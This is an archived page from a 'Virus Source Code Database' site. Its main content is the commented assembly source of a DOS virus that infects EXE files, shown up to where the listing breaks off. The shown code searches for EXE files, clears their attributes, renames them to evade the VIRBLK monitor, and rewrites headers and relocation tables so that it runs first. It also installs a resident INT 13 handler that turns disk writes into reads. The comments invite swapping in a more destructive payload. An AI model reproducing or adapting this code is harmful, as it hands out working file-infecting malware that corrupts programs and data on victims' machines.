<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: icemix1_asm</title>
<meta name="KEYWORDS" content="icemix1.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for icemix1.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ice_asm.php">ice_asm</a><br>
<a href="iceburn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iceburn_asm.php">iceburn_asm</a><br>
<a href="icecream_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icecream_asm.php">icecream_asm</a><br>
<a href="icelandi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icelandi_asm.php">icelandi_asm</a><br>
<a href="icel_mix_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icel_mix_asm.php">icel_mix_asm</a><br>
<a href="icemelt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemelt_asm.php">icemelt_asm</a><br>
<a href="icemix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/icemix1_asm.php">icemix1_asm</a><br>
<a href="igor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/igor_asm.php">igor_asm</a><br>
<a href="ikv_528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv_528_asm.php">ikv_528_asm</a><br>
<a href="ikv528x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ikv528x_asm.php">ikv528x_asm</a><br>
<a href="imm-265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-265_asm.php">imm-265_asm</a><br>
<a href="imm-353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-353_asm.php">imm-353_asm</a><br>
<a href="imm-377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-377_asm.php">imm-377_asm</a><br>
<a href="imm-510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-510_asm.php">imm-510_asm</a><br>
<a href="imm-550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/imm-550_asm.php">imm-550_asm</a><br>
<a href="immor265_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor265_asm.php">immor265_asm</a><br>
<a href="immor353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor353_asm.php">immor353_asm</a><br>
<a href="immor377_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor377_asm.php">immor377_asm</a><br>
<a href="immor510_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor510_asm.php">immor510_asm</a><br>
<a href="immor550_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/immor550_asm.php">immor550_asm</a><br>
<a href="incdaddy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incdaddy_asm.php">incdaddy_asm</a><br>
<a href="incmummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incmummy_asm.php">incmummy_asm</a><br>
<a href="incsistr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incsistr_asm.php">incsistr_asm</a><br>
<a href="incubus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus1_asm.php">incubus1_asm</a><br>
<a href="incubus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/incubus_asm.php">incubus_asm</a><br>
<a href="indit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/indit_asm.php">indit_asm</a><br>
<a href="infecta_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infecta_asm.php">infecta_asm</a><br>
<a href="infect_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infect_asm.php">infect_asm</a><br>
<a href="infectb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/infectb_asm.php">infectb_asm</a><br>
<a href="inferdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inferdem_asm.php">inferdem_asm</a><br>
<a href="insert_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insert_asm.php">insert_asm</a><br>
<a href="ins_real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins_real_asm.php">ins_real_asm</a><br>
<a href="ins-real_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ins-real_asm.php">ins-real_asm</a><br>
<a href="insuff_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/insuff_asm.php">insuff_asm</a><br>
<a href="int_13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int_13_asm.php">int_13_asm</a><br>
<a href="int-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int-13_asm.php">int-13_asm</a><br>
<a href="int13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13__asm.php">int13__asm</a><br>
<a href="int13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/int13_asm.php">int13_asm</a><br>
<a href="intr1440_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1440_asm.php">intr1440_asm</a><br>
<a href="intr1988_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intr1988_asm.php">intr1988_asm</a><br>
<a href="intrude__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intrude__asm.php">intrude__asm</a><br>
<a href="intruder_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/intruder_asm.php">intruder_asm</a><br>
<a href="inv_danu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_danu_asm.php">inv_danu_asm</a><br>
<a href="invdanub_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invdanub_asm.php">invdanub_asm</a><br>
<a href="inv_evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv_evil_asm.php">inv_evil_asm</a><br>
<a href="inv-evil_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/inv-evil_asm.php">inv-evil_asm</a><br>
<a href="invol_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/invol_asm.php">invol_asm</a><br>
<a href="iod_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/iod_asm.php">iod_asm</a><br>
<a href="ir144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ir144_asm.php">ir144_asm</a><br>
<a href="irm_kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/irm_kill_asm.php">irm_kill_asm</a><br>
<a href="israel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/israel_asm.php">israel_asm</a><br>
<a href="it_457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_457_asm.php">it_457_asm</a><br>
<a href="it-457_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it-457_asm.php">it-457_asm</a><br>
<a href="ital_boy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ital_boy_asm.php">ital_boy_asm</a><br>
<a href="italian_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italian_asm.php">italian_asm</a><br>
<a href="italiano_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/italiano_asm.php">italiano_asm</a><br>
<a href="it_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_asm.php">it_asm</a><br>
<a href="it_pest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/it_pest_asm.php">it_pest_asm</a><br>
<a href="itti_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_a_asm.php">itti_a_asm</a><br>
<a href="itti-a___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a___asm.php">itti-a___asm</a><br>
<a href="itti-a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a__asm.php">itti-a__asm</a><br>
<a href="itti-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-a_asm.php">itti-a_asm</a><br>
<a href="itti_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti_b_asm.php">itti_b_asm</a><br>
<a href="itti-b___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b___asm.php">itti-b___asm</a><br>
<a href="itti-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b__asm.php">itti-b__asm</a><br>
<a href="itti-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itti-b_asm.php">itti-b_asm</a><br>
<a href="itty_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_a_asm.php">itty_a_asm</a><br>
<a href="itty-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-a_asm.php">itty-a_asm</a><br>
<a href="itty_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty_b_asm.php">itty_b_asm</a><br>
<a href="itty-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itty-b_asm.php">itty-b_asm</a><br>
<a href="itwisted_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwisted_asm.php">itwisted_asm</a><br>
<a href="itwistu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/itwistu_asm.php">itwistu_asm</a><br>
<a href="ivpbecky_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbecky_asm.php">ivpbecky_asm</a><br>
<a href="ivpbubb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubb2_asm.php">ivpbubb2_asm</a><br>
<a href="ivpbubbl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpbubbl_asm.php">ivpbubbl_asm</a><br>
<a href="ivp-dan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dan_asm.php">ivp-dan_asm</a><br>
<a href="ivp-darl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-darl_asm.php">ivp-darl_asm</a><br>
<a href="ivp-dj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-dj_asm.php">ivp-dj_asm</a><br>
<a href="ivpmorbd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpmorbd_asm.php">ivpmorbd_asm</a><br>
<a href="ivpputer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpputer_asm.php">ivpputer_asm</a><br>
<a href="ivp-rose_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivp-rose_asm.php">ivp-rose_asm</a><br>
<a href="ivpshock_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/ivpshock_asm.php">ivpshock_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/v/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/v/index.php'" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;--------------------------------------------------------------------;
;                                                                    ;
;                  EXE virus, with resident part                     ;
;                                                                    ;
;                   ---- infecting program ----                      ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;--------------------------------------------------------------------;
;                                                                    ;
;    WARNING : it's definitely NOT safe to assemble and execute      ;
;    this code. If anybody has to, I highly reccomend using          ;
;    a diskette and debugger.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;*********************************************************************
  
;--------------------------------------------------------------------;
;                                                                    ;
; The EXE virus concept is as follows:                               ;
;                                                                    ;
; First, original Disk Transfer Address is preserved to avoid        ;
; changing command-line text. Also initial values of CS, IP, SS, SP  ;
; DS and ES are saved (to be restored on exit from virus code).      ;
;   Virus is to be appended to original code and, of course, has     ;
; to be relocated before it's executed. Thus, first we look for      ;
; an EXE file. Then we have to know if this is in fact an EXE        ;
; (checking for magic 'MZ' signature) and if there is any free space ;
; in relocation table. This is checked by substracting relocation    ;
; table end (i.e. sum of table start and number of relocation items, ;
; multiplied by table entry size) from EXE header size.              ;
;   Smart virus shouldn't infect a file that's already infected.     ;
; So first 4 bytes of code to be executed is compared against        ;
; virus code. If they match one another, no infection takes place.   ;
;   Having found suitable file, we compute its code end and append   ;
; virus at the end of code, writing alignment to last 512-bytes page ;
; boundary if necessary. Original start address is preserved inside  ;
; virus, and CS:IP value in EXE header gets changed, so that virus   ;
; code would be executed first. Number of pages gets changed,        ;
; together with Last Page Size and Number Of Relocation Items.       ;
;   New relocation item address is appended to relocation table,     ;
; pointing to the segment of the far jump in virus (this is the jump ;
; virus uses to return to original code).                            ;
;   Upon returning from virus, all saved registers and DTA are       ;
; restored to reestablish environment state as if no virus existed.  ;
;                                                                    ;
;   Virus also installs resident part, if it is not already present. ;
; This part's job is to replace all disk 'writes' with corresponding ;
; 'reads'. It's rather unharmful, but can easily be replaced with    ;
; more dangerous one (if somebody is really keen to be called ...).  ;
; Instalation can be removed with equal ease, as well.               ;
;                                                                    ;
;   The real trouble with EXEs is that DOS pays a little (if any)    ;
; attention to Last Page Size. Therefore EXE files ofen have this    ;
; zeroed, even if they have some code on the last page. Writing to   ;
; last page can cause system crash while infected file is being      ;
; executed. To solve the problem, one should first test if EXE file  ;
; really ends as the header contents say and move to last page end   ;
; instead of appending any bytes, if possible.                       ;
;                                                                    ;
;   Another problem is infecting EXEs containg debug info.           ;
; It comes in various formats, and often contains vital informations ;
; placed behind code. This info gets destroyed when file becomes     ;
; infected. I see no solution to this problem, so far.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;********************************************************************;
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT dummy                               ;
;                                                                    ;
;   Raison d'etre of this segment is to force assembling of          ;
;   the JMP FAR after the execution of virus code.                   ;
;                                                                    ;
;   This segment serves also to make it possible for the infecting   ;
;   program to return to DOS.                                        ;
;                                                                    ;
;--------------------------------------------------------------------;
  
  
    dummy    segment  'dummy'
  
             assume cs: dummy
  
    d_end    label far          ; this is the point virus jumps to
                                ; after executing itself
             mov  ah, 4Ch
             int  21h           ; DOS EXIT function
  
    dummy    ends
  
;--------------------------------------------------------------------;
;                                                                    ;
;                        SEGMENT code                                ;
;                                                                    ;
;   Code for virus (including its resident part).                    ;
;                                                                    ;
;   Executed from label start:. Exits via dummy:d_end.               ;
;                                                                    ;
;--------------------------------------------------------------------;
  
    code     segment  'code'
  
             public   start, jump, old_IP, old_CS, old_DTA,
             public   next, ok, exit, header, DTA, file_name, old_SS, old_SP, aux
             public   last_page, page_count, item_count, header_size, table_start
             public   header_IP, header_CS, header_SS, header_SP, aux_CS, aux_IP
             public   not_ok, time, date, attributes, new_name, found_name
             public   restore_and_close, dot, seek_dot, next_letter, install_flag
             public   next_lttr, EXE_sign, int_CS, int_IP, virus_length, set_ES
             public   resident, resident_size, l1, call_int, install, set_DS
  
             assume   cs : code, ds : code
  
;--------------------------------------------------------------------;
;                                                                    ;
;          Here are symbolic names for memory locations              ;
;                                                                    ;
;--------------------------------------------------------------------;
  
;  First go names for EXE header contents
  
    EXE_sign     equ  word ptr [header]
    last_page    equ  word ptr [header + 2]
    page_count   equ  word ptr [header + 4]
    item_count   equ  word ptr [header + 6]
    header_size  equ  word ptr [header + 8]
    header_SS    equ  word ptr [header + 0Eh]
    header_SP    equ  word ptr [header + 10h]
    header_IP    equ  word ptr [header + 14h]
    header_CS    equ  word ptr [header + 16h]
    table_start  equ  word ptr [header + 18h]
  
;  Now names for address of mother program
  
    old_IP       equ  word ptr [jump + 1]
    old_CS       equ  word ptr [jump + 3]
  
;  Segment to put resident part in, for instance end of 2nd Hercules page
  
   resident_CS   equ  0BFFEh
  
;  And label for the name of the file found by  Find_First and Find_Next
  
    found_name   equ  DTA + 1Eh
  
;  Last is virus length
  
    virus_length equ  offset header
  
;------------ Now starts virus code --------------------------------;

;  First original values of SS, SP, ES, DS are preserved,
;  and new values for this registers are set
  
    start:   mov  cx, ss            ; temporarily save SS in CX
             mov  dx, sp            ; and SP in DX
  
             mov  ax, cs            ; now AX = CODE
             cli                    ; disable hard ints while changing stack
             mov  ss, ax            ; now SS = CODE
             mov  sp, 0FFFFh        ; and SS points to segment end
             sti                    ; hardware interrupts are OK now
  
             push ds                ; preserve DS on stack
             push es                ; same with ES
  
             push cs
             pop  ds                ; set DS to CODE
  
             mov  [old_SS], cx      ; now as DS is CODE, we can store
             mov  [old_SP], dx      ; original SS and SP in memory
  
;  Original DTA is preserved now
  
             mov  ah, 2Fh
             int  21h
             mov  word ptr [old_DTA], bx      ; now ES:BX points to DTA
             mov  word ptr [old_DTA + 2], es  ; save its address in memory
  
;  Call to Get_DTA would have destroyed ES. Now set it
  
             push ds              ; set  ES to CODE
             pop  es
  
;  And now new DTA is established for virus disk actions
  
             mov  dx, offset DTA  ; DS:DX point to new DTA
             mov  ah, 1Ah
             int  21h
  
;  Store original INT_13 vector for use in resident part
  
             mov  ax, 3513h
             int  21h            ; DOS Get_Interrupt_Vector function

             mov  [int_IP], bx   ; now ES:BX holds INT_13 vector
             mov  [int_CS], es   ; store it inside resident part
  
;  Check if resident part already present
  
             mov  ax, es           ; compare can work with AX
  
             cmp  ax, resident_CS  ; check if this is resident_CS
             jnz  install          ; no, so install
  
             cmp  bx, 0            ; is offset 0 ?
             jnz  install          ; no, so install
  
;  Resident part found, do not install
  
             mov  [install_flag], 0 ; signal 'no installing'
  
             jmp  short  set_ES     ; and omit copying code
  
;  Now resident part is moved to its place in memory
  
install:     mov  ax, resident_CS
             mov  es, ax              ; ES = segment for resident part
             xor  di, di              ; DI = 0, resident starts from offset 0
             mov  si, offset resident ; SI = offset in DS for resident part
             mov  cx, resident_size   ; CX = size of resident part
  
             cld                      ; set auto increment
             rep  movsb               ; copy resident part from DS:SI to ES:DI
  
             mov  [install_flag], 1   ; signal 'instal vector'
  
;  Reestablish destroyed ES to CODE
  
  set_ES:    push ds
             pop  es
  
;  Now decode "*.EXE" name pattern. It's coded to disable 'eye-shot' discovery
  
             mov  si, offset file_name   ; name pattern starts there
             mov  cx, 5                  ; and is 5 bytes long
  
next_letter: inc  byte ptr [si]          ; decode by incrementing by one
             inc  si
             loop next_letter            ; decode all 5 bytes
  
;  Find an EXE file
  
             mov  dx, offset file_name   ; DS:DX points to '*.EXE'
             mov  cx, 20h                ; search for read-only files too
  
             mov  ah, 4Eh                ; DOS Find_First function
             int  21h                    ; now DTA gets filled with info
  
             jnc  check                  ; no carry means file found
                                         ; jump to check if to infect file
  
             jmp  exit                   ; no EXE file - nothing to do
  
;  Find next EXE file, if necessary
  
    next:    mov  ah, 4Fh                ;DOS Find_Next function
             int  21h
  
             jnc  check                  ; see jumps after Find_First
             jmp  exit                   ; for explanation
  
;  Check if file should and can be infected
  
;  First of all, get file attributes
  
    check:   mov  dx, offset found_name   ; DS:DX points to found file name
  
             mov  ax, 4300h               ; DOS Get_File_Attributes function
             int  21h                     ; attributes returned in CX
  
             mov  [attributes], cx        ; preserve them in memory
  
;  Then change file attributes to 'neutral'
  
             mov  dx, offset found_name   ; DS:DX points to found file name
             xor  cx, cx                  ; CX = 0 - means no attributes set
  
             mov  ax, 4301h               ; DOS Set_File_Attributes function
             int  21h                     ; attributes to be set in CX
  
;  To avoid being spotted by VIRBLK, rename ????????.EXE to ???????.
  
             mov  si, offset found_name   ; DS:DX points to found file name
             mov  di, offset new_name     ; ES:DI points to new name
  
             cld                          ; set auto increment
  
;  Copy old name to new name until dot found
  
  seek_dot:  lodsb                        ; get character at DS:SI
             cmp  al, '.'                 ; check if it is a dot
             stosb                        ; copy it anyway to ES:DI
  
             jz   dot                     ; dot found, end of copying
  
             loop seek_dot                ; if no dot, copy next character
  
;  DOS requires ASCIIZ strings, so append a byte of 0 to new name
  
       dot:  xor  al, al                  ; AL = 0
             stosb                        ; store 0 to byte at ES:DI
  
;  Now rename can be performed
  
             mov  dx, offset found_name   ; DS:DX points to old name
             mov  di, offset new_name     ; ES:DI points to new name
  
             mov  ah, 56h                 ; DOS Rename_File function
             int  21h
  
;  It is safe to open file now
  
             mov  dx, offset new_name     ; DS:DX points to file name
  
             mov  ax, 3D02h               ; DOS Open_File_Handle fuction
             int  21h                     ; open file for reading and writing
  
             jc   next                    ; carry set means for some reason
                                          ; operation failed
                                          ; try to find next file
  
;  Preserve handle for just open file in BX register
  
             mov  bx, ax                  ; all DOS calls require handle in BX
  
;  Now store original file time and date, to be restored on closing the file
  
             mov  ax, 5700h               ; DOS Get_File_Time_Date function
             int  21h                     ; time returned in CX, date in DX
  
             mov  [time], cx              ; store time in memory
             mov  [date], dx              ; same with date
  
;  Read EXE header to memory
  
             mov  dx, offset header       ; DS:DX = place to read header to
             mov  cx, 1Ah                 ; header is 1Ah bytes long
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Check if it is a real EXE, not just EXE-named file
  
 check_EXE:  cmp  EXE_sign, 5A4Dh         ; first two bytes of header should
                                          ; contain 'MZ' characters
  
	     jne  not_ok                  ; if not, don't proceed with file
  
;  It is EXE, check if it is already infected
;  by comparing code start with itself
  
;  Compute where code in file starts
  
             mov  ax, [header_CS]         ; get start CS for file
             add  ax, [header_size]       ; add header size
  
             mov  cx, 16                  ; above were in 16 bytes units
             mul  cx                      ; so multiply by 16
                                          ; DX|AX holds result
  
             add  ax, [header_IP]         ; add for IP
             adc  dx, 0                   ; propagate carry if necessasry
  
;  Now DX|AX holds file offset for code start, move there
  
             mov  cx, dx                  ; set registers for DOS call
             mov  dx, ax
  
             mov  ax, 4200h               ; DOS Move_File_Ptr function
             int  21h                     ; move relatively to start
  
;  Read first four bytes of code
  
             mov  dx, offset aux          ; DS:DX = place to read code into
             mov  cx, 4                   ; CX = number of bytes to read
  
             mov  ah, 3Fh                 ; DOS Read_Handle function
             int  21h
  
;  Compare them with itself
  
             mov  di, offset aux          ; ES:DI points to code from file
             mov  si, offset start        ; DS:SI points to itself start
             mov  cx, 2                   ; CX = number of words to compare
             cld                          ; set auto increment
  
             repe cmpsw                   ; compare while equal
  
             je   not_ok                  ; equal = infected, don't proceed
  
;  Check if there is space in relocation table to put one more item
  
;  Calculate where Relocation_Table ends
  
             mov  ax, [item_count]        ; get number of Relocation Items
             inc  ax                      ; add for new one
             mov  cx, 4                   ; each one is 4 bytes long
             mul  cx                      ; so multiply by 4
                                          ; DX|AX holds result
  
             add  ax, [table_start]       ; add offset of Relocation_Table
             adc  dx, 0                   ; process carry
  
;  Now DX|AX holds file offset for table end, store it temporarily in DI|SI
  
             mov  di, dx                  ; preserve Relocation_Table offset
             mov  si, ax
  
;  Calculate where code starts (in file)
  
             mov  ax, [header_size]       ; get header size for this EXE
             mov  cx, 10h                 ; as it is in 16 byte units,
             mul  cx                      ; multiply by 16
                                          ; DX|AX holds result
  
;  See if there is free space for relocation item
  
             sub  ax, si                  ; substract Relocation_Table end
             sbb  dx, di
  
             jae  ok                      ; Relocation_Table end not less
                                          ; then code start, so there IS room
  
;  If somehow this file is not to be infected, restore it's original state
  
    not_ok:  call restore_and_close
  
             jmp  next          ; nevertheless, try to find infectable one
  
;  File is to be infected now
  
;  First adjust file offset for new relocation item
  
    ok:      sub  si, 4                   ; new item starts 4 bytes
             sbb  di, 0                   ; before Relocation_Table end
  
;  Then preserve temporarily address of the mother code
  
             mov  ax, [old_CS]           ; preserve jump address via AX
             mov  [aux_CS], ax           ; in memory
             mov  ax, [old_IP]
             mov  [aux_IP], ax
  
;  Form inside itself a jump to new mother start
  
             mov  ax, [header_IP]        ; store new mother CS:IP as jump
             mov  [old_IP], ax           ; do it via AX
             mov  ax, [header_CS]
             mov  [old_CS], ax
  
;  Calculate last page alignment
  
             mov  cx, [last_page]         ; CX = number of bytes in last page
             mov  ax, 200h                ; AX = page size (page is 512 bytes)
  
             sub  ax, cx                  ; CX = alignment to page boundary
  
             mov  bp, ax                  ; preserve alignment in BP
  
; Calculate new CS:IP values to execute virus instead of mother
  
             mov  ax, [page_count]        ; get number of pages in new mother
             mov  cx, 20h                 ; multiply by 32 to convert to
             mul  cx                      ; 16 bytes units
  
             sub  ax, [header_size]       ; decrease by header size
  
;  Modify header as necessary
  
             mov  [header_CS], ax         ; AX holds CS for virus
             xor  ax, ax                  ; now zero AX
             mov  [header_IP], ax         ; as IP for virus is 0
  
             add  [page_count], 2         ; reserve space for virus
  
             inc  [item_count]            ; there'll be one more item
  
             mov  [last_page], offset header   ; last page will be as long
                                               ; as virus itself
             and  [last_page], 1FFh            ; modulo 512, of course
  
;  Move to file start
  
             xor  cx, cx                 ; start means offset 0
             xor  dx, dx
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new header
  
             mov  dx, offset header      ; DS:DX points to new header
             mov  cx, 1Ah                ; which is still 1A bytes long
  
             mov  ah, 40h                ; DOS Write_Handle function
             int  21h
  
;  Move to new Relocation Item position
  
             mov  cx, di                 ; get stored position from DI|SI
             mov  dx, si
  
             mov  ax, 4200h              ; DOS Move_File_Ptr function
             int  21h                    ; move relatively to start
  
;  Write new relocation item
  
             mov  [header_IP], offset old_CS ; new Relocation Item offset
                                             ; is jump to new mother code
  
             mov  dx, offset header_IP       ; DS:DX = new relocation item
             mov  cx, 4                      ; exactly 4 bytes long
  
             mov  ah, 40h                 ; DOS Write_Handle function
             int  21h
  
;  Calculate file offset for new mother code end
  
             mov  ax, [header_CS]      ; get mother code lenght
             add  ax, [header_size]    ; add header size
             mov  cx, 10h              ; it's in 16 bytes units
             mul  cx                   ; so multiply by 16
  
             sub  ax, bp               ; last page is not full
             sbb  dx, 0                ; so move back appropirately
  
;  Move file ptr to mother code end
  
             mov  cx, dx               ; DX|AX = file offset to code end
             mov  dx, ax               ; set CX|DX for DOS call
  
             mov  ax, 4200h            ; DOS Move_File_Ptr function
